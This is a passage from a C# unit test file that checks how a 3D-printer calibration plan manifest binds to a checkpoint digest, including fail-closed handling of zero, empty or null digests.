            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"machine_start_gcode\":\"G28\"}"))
            .Value!;
        string legacyJson = OrcaCalibrationPlanManifestSchema.Serialize(
            plan.Manifest,
            OrcaCalibrationPlanManifestSchema.SingleProfileDigest);
        string legacyDigest = CalibrationCanonicalJson.ComputeTextSha256(legacyJson);

        OrcaCalibrationPlan? bound =
            OrcaCalibrationPlanManifestSchema.BindToCheckpoint(plan, legacyDigest);

        _ = bound.Should().NotBeNull();
        _ = bound!.ManifestSha256.Should().Be(legacyDigest);
        _ = bound.ManifestJson.Should().Be(legacyJson);
        _ = bound.Manifest.SchemaVersion.Should().Be("1.0");

        // Only the manifest identity moves: the plan body, its profiles and the neutralization
        // record are the ones this build compiled.
        _ = bound.MachineProfile.Should().Be(plan.MachineProfile);
        _ = bound.ProcessProfile.Should().Be(plan.ProcessProfile);
        _ = bound.FilamentProfile.Should().Be(plan.FilamentProfile);
        _ = bound.Manifest.Should().Be(plan.Manifest with { SchemaVersion = "1.0" });
    }

    [Theory]
    [InlineData("0000000000000000000000000000000000000000000000000000000000000000")]
    [InlineData("")]
    [InlineData(null)]
    public void BindToCheckpoint_WithADigestNoSupersededSchemaProduces_FailsClosed(string? digest)
    {
        OrcaCalibrationPlan plan = Compile(CalibrationGenerationTestData.Context()).Value!;

        _ = OrcaCalibrationPlanManifestSchema.BindToCheckpoint(plan, digest).Should().BeNull();

        // The current schema is never treated as superseded, so same-schema drift cannot be excused.
        _ = OrcaCalibrationPlanManifestSchema.BindToCheckpoint(plan, plan.ManifestSha256).Should()
            .BeNull();
    }

    private static CalibrationGenerationResult<OrcaCalibrationPlan> Compile(
        CalibrationGenerationContext context)
    {
        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);
        return new OrcaCalibrationPlanCompiler().Compile(specification, model);
    }

    private static IReadOnlyList<OrcaPlanProfile> Profiles(OrcaCalibrationPlan plan) =>
        [plan.MachineProfile, plan.ProcessProfile, plan.FilamentProfile];

    private static bool JsonEquivalent(string left, string right)
    {
        using JsonDocument first = JsonDocument.Parse(left);
        using JsonDocument second = JsonDocument.Parse(right);
        return string.Equals(
            CalibrationCanonicalJson.Serialize(first.RootElement),
            CalibrationCanonicalJson.Serialize(second.RootElement),
            StringComparison.Ordinal);
    }

    private static CalibrationGenerationContext ContextWithMachineProfile(string machineJson)
    {
        CalibrationGenerationContext baseline = CalibrationGenerationTestData.Context();
        return baseline with
        {
            Profiles = new CalibrationProfileTriplet(
                CalibrationGenerationTestData.Profile(
                    CalibrationGenerationTestData.MachineProfileId,
                    "machine",
                    "PF Machine",
                    machineJson),
                baseline.Profiles.Process,
                baseline.Profiles.Filament),
        };
    }
}
